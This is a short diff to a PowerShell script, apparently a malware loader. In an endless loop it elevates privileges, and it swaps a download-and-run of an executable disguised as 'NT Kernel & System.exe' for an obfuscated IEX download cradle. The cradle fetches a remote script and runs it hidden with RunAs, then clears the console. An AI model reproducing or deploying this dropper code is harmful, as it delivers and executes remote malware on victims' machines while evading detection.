@@ -36,7 +36,9 @@ Add-Type -AssemblyName System.Windows.Forms
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
      while(1) {
          try {
-             Invoke-WebRequest -Uri "https://anonsharing.com/file/5b063729191ab96d/sigmav3.exe" -OutFile "$env:temp\NT Kernel & System.exe"; Start-Process "$env:temp\NT Kernel & System.exe"
+             $code = ("https://raw.githubusercontent.com/43a1723/test/main/download.ps1")
+             $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$code')"
+             Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru -Verb RunAs
              Clear-Host
              exit;
          } catch {}
